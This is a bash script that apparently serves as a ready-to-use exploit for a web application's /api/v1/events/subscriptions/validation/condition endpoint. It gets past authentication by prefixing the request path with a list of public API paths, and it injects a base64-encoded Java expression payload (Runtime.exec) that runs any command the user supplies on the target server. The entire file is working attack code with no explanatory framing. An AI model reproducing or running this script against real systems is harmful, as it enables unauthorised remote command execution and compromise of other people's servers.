#!/bin/bash

# Function to validate the target URL format
validate_target_url() {
    local url="$1"
    local regex='^https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/.*)?$'
    if [[ ! "$url" =~ $regex ]]; then
        echo "Invalid URL format."
        exit 1
    fi
    echo "$(echo "$url" | grep -oP '^https?://[a-zA-Z0-9.-]+(:[0-9]+)?')"
}

# Main execution function
run_exploit() {
    local target_url=""
    local command=""

    # Parse command line arguments
    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            --target) target_url="$2"; shift ;;
            --cmd) command="$2"; shift ;;
            *) echo "Unknown parameter passed: $1"; exit 1 ;;
        esac
        shift
    done

    if [[ -z "$target_url" || -z "$command" ]]; then
        echo "Usage: $0 --target <target_url> --cmd <command>"
        exit 1
    fi

    # Validate the target URL
    target_url=$(validate_target_url "$target_url")

    # Step 1: Initial availability check
    local check_endpoint="${target_url}/api/v1/events/subscriptions/validation/condition/1234"
    local response=$(curl -s -w "%{http_code}" "$check_endpoint")
    local status_code=${response: -3}
    local body=${response:0:${#response}-3}

    if [[ "$status_code" -eq 401 && "$body" == *"Not Authorized! Token not present"* ]]; then
        echo "[+] Initial availability check passed."
    else
        echo "[-] Initial availability check failed."
        if [[ "$status_code" -eq 400 ]]; then
            exit 1
        fi
        exit 1
    fi

    # Step 2: Perform the exploitation
    local encoded_command=$(echo -n "$command" | base64)
    echo "[+] Command to execute: $command (Base64: $encoded_command)"

    local crafted_payload="T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(\"${encoded_command}\")))"
    echo "[+] Payload crafted: $crafted_payload"

    local url_encoded_payload=$(echo -n "$crafted_payload" | jq -sRr @uri)

    local paths_to_skip=(
        '/v1/users/login'
        '/v1/users/signup'
        '/v1/users/registrationConfirmation'
        '/v1/users/resendRegistrationToken'
        '/v1/users/generatePasswordResetLink'
        '/v1/users/password/reset'
        '/v1/users/checkEmailInUse'
        '/v1/users/refresh'
        '/v1/system/config'
        '/v1/system/version'
    )

    for path in "${paths_to_skip[@]}"; do
        local exploit_endpoint="${target_url}/api/v1;v1$(echo -n "$path" | jq -sRr @uri)/events/subscriptions/validation/condition/${url_encoded_payload}"
        echo "[+] Checking URL: $exploit_endpoint"
        response=$(curl -s -w "%{http_code}" "$exploit_endpoint")
        status_code=${response: -3}
        body=${response:0:${#response}-3}

        if [[ "$status_code" -ne 401 && "$body" != *"Not Authorized! Token not present"* ]]; then
            echo "[+] Command executed successfully."
            exit 0
        fi
    done

    echo "[-] Exploitation unsuccessful. Exiting..."
}

# Execute the main function
run_exploit "$@"
